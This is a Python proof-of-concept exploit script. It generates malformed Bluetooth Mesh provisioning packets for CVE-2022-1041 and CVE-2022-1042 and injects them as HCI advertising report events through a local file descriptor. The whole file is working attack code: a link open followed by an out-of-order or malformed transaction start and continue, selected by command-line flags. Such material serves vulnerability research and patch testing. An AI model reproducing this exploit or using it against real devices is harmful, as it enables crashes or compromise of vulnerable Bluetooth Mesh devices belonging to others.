import argparse
import os
import subprocess
import time

from loguru import logger
from HCIPacket.EventPacket import *
from scapy.layers.bluetooth import HCI_Hdr

def gen_CVE_2022_1042(mac: str) -> bytes:
    # open link
    payload = ProvisioningBearerControlLinkOpen(
        0, 0,
        struct.pack("H", 0xdddd) + b'\x00' * 14).bytes
    report = HciLeExtendedAdvertisingReportEvent.Report(
        HciLeExtendedAdvertisingReportEvent.
        EVENT_TYPE_LEGACY_ADVERTISING_PDU_USED,
        HciLeExtendedAdvertisingReportEvent.AddressType.RANDOM_DEVICE,
        Address(mac),
        HciLeExtendedAdvertisingReportEvent.PrimaryPHY.LE_1M,
        HciLeExtendedAdvertisingReportEvent.SecondaryPHY.NONE, 0xFF, 0x7F,
        0x9F, 0x0,
        HciLeExtendedAdvertisingReportEvent.DirectAddressType.PUBLIC_DEVICE,
        Address("00:00:00:00:00:00"), payload)
    link_open = HciLeExtendedAdvertisingReportEvent([report])
    # continue transaction without starting
    payload = TransactionContinuePDU(0, 0, 4, b'\xaa\xaa').bytes
    report = HciLeExtendedAdvertisingReportEvent.Report(
        HciLeExtendedAdvertisingReportEvent.
        EVENT_TYPE_LEGACY_ADVERTISING_PDU_USED,
        HciLeExtendedAdvertisingReportEvent.AddressType.RANDOM_DEVICE,
        Address(mac),
        HciLeExtendedAdvertisingReportEvent.PrimaryPHY.LE_1M,
        HciLeExtendedAdvertisingReportEvent.SecondaryPHY.NONE, 0xFF, 0x7F,
        0x9F, 0x0,
        HciLeExtendedAdvertisingReportEvent.DirectAddressType.PUBLIC_DEVICE,
        Address("00:00:00:00:00:00"), payload)
    transaction_continue = HciLeExtendedAdvertisingReportEvent([report])

    return link_open.bytes, transaction_continue.bytes


def gen_CVE_2022_1041(mac: str):
    # open link
    payload = ProvisioningBearerControlLinkOpen(
        0, 0,
        struct.pack("H", 0xdddd) + b'\x00' * 14).bytes
    report = HciLeExtendedAdvertisingReportEvent.Report(
        HciLeExtendedAdvertisingReportEvent.
        EVENT_TYPE_LEGACY_ADVERTISING_PDU_USED,
        HciLeExtendedAdvertisingReportEvent.AddressType.RANDOM_DEVICE,
        Address(mac),
        HciLeExtendedAdvertisingReportEvent.PrimaryPHY.LE_1M,
        HciLeExtendedAdvertisingReportEvent.SecondaryPHY.NONE, 0xFF, 0x7F,
        0x9F, 0x0,
        HciLeExtendedAdvertisingReportEvent.DirectAddressType.PUBLIC_DEVICE,
        Address("00:00:00:00:00:00"), payload)
    link_open = HciLeExtendedAdvertisingReportEvent([report])
    # start transaction
    payload = TransactionStartPDU(0, 0, 60, 58, 0, b'\xaa\xaa').bytes
    report = HciLeExtendedAdvertisingReportEvent.Report(
        HciLeExtendedAdvertisingReportEvent.
        EVENT_TYPE_LEGACY_ADVERTISING_PDU_USED,
        HciLeExtendedAdvertisingReportEvent.AddressType.RANDOM_DEVICE,
        Address(mac),
        HciLeExtendedAdvertisingReportEvent.PrimaryPHY.LE_1M,
        HciLeExtendedAdvertisingReportEvent.SecondaryPHY.NONE, 0xFF, 0x7F,
        0x9F, 0x0,
        HciLeExtendedAdvertisingReportEvent.DirectAddressType.PUBLIC_DEVICE,
        Address("00:00:00:00:00:00"), payload)
    transaction_start = HciLeExtendedAdvertisingReportEvent([report])
    # continue transaction
    payload = TransactionContinuePDU(0, 0, 4, b'\xaa\xaa').bytes
    report = HciLeExtendedAdvertisingReportEvent.Report(
        HciLeExtendedAdvertisingReportEvent.
        EVENT_TYPE_LEGACY_ADVERTISING_PDU_USED,
        HciLeExtendedAdvertisingReportEvent.AddressType.RANDOM_DEVICE,
        Address(mac),
        HciLeExtendedAdvertisingReportEvent.PrimaryPHY.LE_1M,
        HciLeExtendedAdvertisingReportEvent.SecondaryPHY.NONE, 0xFF, 0x7F,
        0x9F, 0x0,
        HciLeExtendedAdvertisingReportEvent.DirectAddressType.PUBLIC_DEVICE,
        Address("00:00:00:00:00:00"), payload)
    transaction_continue = HciLeExtendedAdvertisingReportEvent([report])
    return link_open.bytes, transaction_start.bytes, transaction_continue.bytes

def get_mac():
    tool_output = subprocess.check_output(["hcitool", "dev"], encoding="utf-8")
    for line in tool_output.splitlines():
        line = line.strip()
        if not line.startswith("hci0"):
            continue
        mac = line.split()
        return mac[1]
    return None

def main(args):
    mac = get_mac()
    wait_time = args.wait_time
    if mac is None:
        logger.error("Unable to decide local bluetooth device MAC address")
        os._exit(1)
    
    if args.cve_2022_1041:
        logger.info("Injecting payload for CVE-2022-1041")
        payload = gen_CVE_2022_1041(mac)
    elif args.cve_2022_1042:
        logger.info("Injecting payload for CVE-2022-1042")
        payload = gen_CVE_2022_1042(mac)
    else:
        logger.warning("No CVE number is specified, exit")
        return
    exp_fd = os.open("./exp", os.O_WRONLY | os.O_SYNC)
    for p in payload:
        os.write(exp_fd, p)
        HCI_Hdr(p).show()
        time.sleep(wait_time)
    os.close(exp_fd)
    logger.success("Payload injected!")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--cve-2022-1041", action="store_true", default=False)
    parser.add_argument("--cve-2022-1042", action="store_true", default=False)
    parser.add_argument("-w", "--wait-time", required=False, type=float, help="Time to wait between injecting two packets", default=3.0)
    args = parser.parse_args()
    main(args)
